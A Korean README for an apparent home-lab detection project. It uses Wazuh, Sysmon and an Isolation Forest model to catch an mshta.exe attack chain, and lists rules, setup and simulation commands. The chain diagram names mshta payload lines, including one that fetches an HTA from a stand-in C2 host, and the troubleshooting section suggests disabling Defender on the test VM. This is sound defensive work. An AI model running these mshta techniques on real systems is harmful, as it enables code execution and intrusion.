# mshta.exe 공격 체인 탐지 프로젝트

**MITRE ATT\&CK: T1046 → T1012 → T1112 → T1218.005**  
Wazuh 4.9.0 기반 홈 SOC 랩 포트폴리오 — 완전판

\---

## 공격 체인 구조

```
\[Phase 1] Nmap 정찰          T1046
    ↓  SYN 스캔, 서비스/OS 탐지
\[Phase 2] Protocol Handler 정찰  T1012
    ↓  Get-OLEScriptingEngine → vbscript: 핸들러 확인
\[Phase 3] 레지스트리 조작        T1112
    ↓  HKCU\\Software\\Microsoft\\evilscript 키 생성
\[Phase 4] mshta 공격 실행        T1218.005
    ├─ mshta http://c2/evil.hta           (C2 URL)
    ├─ mshta about:<script>regread(...)   (Fileless)
    └─ mshta vbscript:Execute(...)        (VBScript)
\[Phase 5] ML 이상탐지 연동       (Isolation Forest)
```

\---

## 탐지 룰 전체 목록

|Rule ID|Phase|설명|심각도|MITRE|
|-|-|-|-|-|
|100000|-|mshta.exe 기본 탐지|MEDIUM|T1218.005|
|100001|Phase 4|C2 URL 원격 HTA 실행|CRITICAL (lv15)|T1218.005, T1105|
|100002|Phase 4|레지스트리 은닉 Fileless|CRITICAL (lv15)|T1218.005, T1112, T1027|
|100003|Phase 4|VBScript 프로토콜 핸들러|HIGH (lv13)|T1218.005, T1059.005|
|100004|Phase 4|COM 객체 생성|HIGH (lv13)|T1218.005, T1059.005|
|100005|Phase 4|스피어피싱 부모 프로세스|HIGH (lv14)|T1218.005, T1566.001|
|100010|Phase 2|OLEScript 핸들러 열거|MEDIUM (lv11)|T1012|
|100011|Phase 2|HKCR 레지스트리 열거|MEDIUM (lv10)|T1012|
|100012|Phase 2|CLSID/COM 스크립트 엔진 열거|HIGH (lv12)|T1012|
|100020|Phase 3|레지스트리 스크립트 키 쓰기|HIGH (lv12)|T1112|
|100030|Phase 4|mshta DNS C2 통신|HIGH (lv13)|T1071|
|100040|Phase 1|Nmap 정찰|LOW (lv10)|T1046|
|100041|Phase 1|Nmap SYN 스텔스 스캔|MEDIUM (lv13)|T1046|
|100050|Phase 5|ML 이상탐지|HIGH (lv12)|T1218.005|
|100051|Phase 5|ML CRITICAL 이상탐지|CRITICAL (lv15)|T1218.005|

\---

## 디렉토리 구조

```
mshta-detection/
├── rules/
│   └── custom\_mshta\_rules.xml          # 전체 탐지 룰 (15개)
├── scripts/
│   ├── attack/
│   │   └── simulate\_attack.sh           # 4단계 공격 시뮬레이션
│   ├── recon/
│   │   └── recon\_protocol\_handlers.py   # Protocol Handler 정찰 분석
│   └── analysis/
│       └── parse\_mshta\_alerts.py        # 전체 체인 파싱/통계/ES 전송
├── ml/
│   └── anomaly\_detector.py              # Isolation Forest 이상탐지
├── dashboard/
│   └── mshta\_dashboard.ndjson           # Kibana 대시보드
└── README.md
```

\---

## 환경

|구성 요소|버전/OS|
|-|-|
|Wazuh Manager|4.9.0 (Rocky Linux 9, Docker)|
|Wazuh Agent|4.9.0 (Windows 10 VM)|
|Sysmon|v15+ (SwiftOnSecurity 설정)|
|Elasticsearch|8.x (포트 9201)|
|Kibana|8.x (포트 5601)|
|공격 VM|Kali Linux (VMware Host-Only)|

\---

## 설치

### 1\. Sysmon 설치 및 설정 (Windows 10 VM)

```powershell
# SwiftOnSecurity 설정 다운로드
Invoke-WebRequest `
  -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
  -OutFile C:\\sysmonconfig.xml

# Sysmon 설치
.\\Sysmon64.exe -accepteula -i C:\\sysmonconfig.xml
```

Sysmon 이벤트 ID 활성화 확인:

* **Event ID 1**: Process Creation (mshta 실행 탐지)
* **Event ID 13**: Registry Value Set (레지스트리 조작 탐지)
* **Event ID 22**: DNS Query (C2 통신 탐지)

### 2\. ossec.conf 설정 (Windows Agent)

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log\_format>eventchannel</log\_format>
</localfile>
```

### 3\. 커스텀 룰 배포 (Wazuh Manager)

```bash
# 룰 파일 복사
docker cp rules/custom\_mshta\_rules.xml \\
  wazuh.manager:/var/ossec/etc/rules/custom\_mshta\_rules.xml

# 문법 검증
docker exec wazuh.manager /var/ossec/bin/ossec-logtest -t

# Manager 재시작
docker exec wazuh.manager /var/ossec/bin/ossec-control restart
```

### 4\. Kibana 대시보드 임포트

```
Kibana → Stack Management → Saved Objects → Import
→ dashboard/mshta\_dashboard.ndjson 업로드
```

\---

## 실행 방법

### Phase 1\~4: 공격 시뮬레이션 전체 실행

```bash
# Kali Linux에서 실행
chmod +x scripts/attack/simulate\_attack.sh
./scripts/attack/simulate\_attack.sh 192.168.126.131
```

생성되는 스크립트:

* `/tmp/nmap\_\*.txt` — Nmap 스캔 결과
* `/tmp/recon\_protocol\_handlers\_sim.ps1` — Phase 2 정찰 스크립트
* `/tmp/mshta\_sim\_payloads.ps1` — Phase 3/4 공격 스크립트
* `/tmp/registry\_sim.ps1` — 레지스트리 조작 스크립트

Windows VM으로 전달 및 실행:

```bash
scp /tmp/recon\_protocol\_handlers\_sim.ps1 user@192.168.126.131:C:\\Temp\\
scp /tmp/mshta\_sim\_payloads.ps1 user@192.168.126.131:C:\\Temp\\
scp /tmp/registry\_sim.ps1 user@192.168.126.131:C:\\Temp\\
```

```powershell
# Windows PowerShell (관리자)
Set-ExecutionPolicy Bypass -Scope Process
C:\\Temp\\recon\_protocol\_handlers\_sim.ps1  # Phase 2
C:\\Temp\\registry\_sim.ps1                 # Phase 3
C:\\Temp\\mshta\_sim\_payloads.ps1           # Phase 4
```

### Phase 2: Protocol Handler 정찰 분석

```bash
# 정찰 탐지 분석
python3 scripts/recon/recon\_protocol\_handlers.py --mode analyst \\
  --input /var/ossec/logs/alerts/alerts.json

# 공격 체인 타임라인
python3 scripts/recon/recon\_protocol\_handlers.py --mode chain \\
  --input /var/ossec/logs/alerts/alerts.json

# 체인 구조 다이어그램
python3 scripts/recon/recon\_protocol\_handlers.py --mode diagram
```

### 전체 체인 알림 파싱

```bash
# 기본 실행 (Wazuh Manager에서)
python3 scripts/analysis/parse\_mshta\_alerts.py

# Phase별 필터
python3 scripts/analysis/parse\_mshta\_alerts.py --phase 4

# CSV + ES 전송 + 최근 24시간
python3 scripts/analysis/parse\_mshta\_alerts.py \\
  --export mshta\_chain.csv \\
  --bulk-send \\
  --es-url http://localhost:9201 \\
  --last 24
```

### Phase 5: ML 이상탐지

```bash
# 기본 실행
python3 ml/anomaly\_detector.py \\
  --input /var/ossec/logs/alerts/alerts.json

# 임계값 조정 + Wazuh 전송 + 모델 저장
python3 ml/anomaly\_detector.py \\
  --threshold -0.2 \\
  --wazuh-send \\
  --save-model ml/model.pkl

# 저장된 모델로 누적 학습
python3 ml/anomaly\_detector.py \\
  --load-model ml/model.pkl \\
  --last 6
```

ML 이상탐지 원리 (Isolation Forest):

* 레이블 없이 동작하는 비지도 학습
* `anomaly\_score = 2^(-avg\_path\_length / c(n))`
* 피처: 명령어 길이, 실행 시간대, 룰 심각도, URL/VBScript/regread/COM 포함 여부

\---

## 실시간 모니터링

```bash
# Wazuh Manager — 공격 체인 실시간 감시
tail -f /var/ossec/logs/alerts/alerts.json | python3 -c "
import sys, json
for l in sys.stdin:
    try:
        d = json.loads(l.strip())
        rid = str(d.get('rule',{}).get('id',''))
        if 100000 <= int(rid) <= 100055:
            ts   = d\['timestamp']\[:19]
            desc = d\['rule']\['description']\[:55]
            lvl  = d\['rule']\['level']
            print(f'\[{ts}] Rule {rid} (lv{lvl}) | {desc}')
    except: pass
"

# Elasticsearch 조회
curl -s 'http://localhost:9201/wazuh-alerts-\*/\_search' \\
  -H 'Content-Type: application/json' \\
  -d '{
    "query": {"range": {"rule.id": {"gte": 100000, "lte": 100055}}},
    "size": 10,
    "sort": \[{"timestamp": "desc"}]
  }' | python3 -m json.tool
```

\---

## 탐지 검증 (Expected Results)

시뮬레이션 완료 후 예상 알림:

```
Phase 1:
  \[timestamp] Rule 100041 (lv13): Nmap - SYN/스텔스 스캔 탐지
Phase 2:
  \[timestamp] Rule 100012 (lv12): PowerShell - CLSID/COM 스크립트 엔진 열거
Phase 3:
  \[timestamp] Rule 100020 (lv12): 레지스트리 - 스크립트 관련 키 쓰기 탐지
Phase 4:
  \[timestamp] Rule 100001 (lv15): mshta.exe - 원격 URL에서 HTA 실행 (C2 의심)
  \[timestamp] Rule 100002 (lv15): mshta.exe - 레지스트리 은닉 스크립트 실행
  \[timestamp] Rule 100003 (lv13): mshta.exe - VBScript 프로토콜 핸들러 악용
  \[timestamp] Rule 100004 (lv13): mshta.exe - 위험 COM 객체 생성 탐지
Phase 5:
  \[timestamp] Rule 100050 (lv12): ML 이상탐지 - mshta 비정상 패턴 감지
```

\---

## 트러블슈팅

**Wazuh 알림 미생성**

1. `Get-Service Sysmon64` — Sysmon 실행 확인
2. `wazuh-agentd` 서비스 상태 확인
3. ossec.conf에 eventchannel 블록 확인
4. `ossec-logtest -t`로 룰 파싱 오류 확인

**mshta.exe 즉시 종료**

* Windows Defender 실시간 보호 일시 비활성화 (테스트 VM 한정)
* 또는 VM 스냅샷 저장 후 테스트

**ML 탐지기 샘플 부족**

* 최소 5건 이상 알림 필요
* 시뮬레이션을 여러 번 반복 실행하여 샘플 축적

\---

## 참고

* [MITRE ATT\&CK T1218.005](https://attack.mitre.org/techniques/T1218/005/)
* [MITRE ATT\&CK T1046](https://attack.mitre.org/techniques/T1046/)
* [MITRE ATT\&CK T1012](https://attack.mitre.org/techniques/T1012/)
* [LOLBAS Project - mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
* [Wazuh Custom Rules](https://documentation.wazuh.com/current/user-manual/ruleset/custom.html)
* [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
* [Isolation Forest Paper](https://cs.nju.edu.cn/zhouzh/zhouzh.files/publication/icdm08b.pdf)

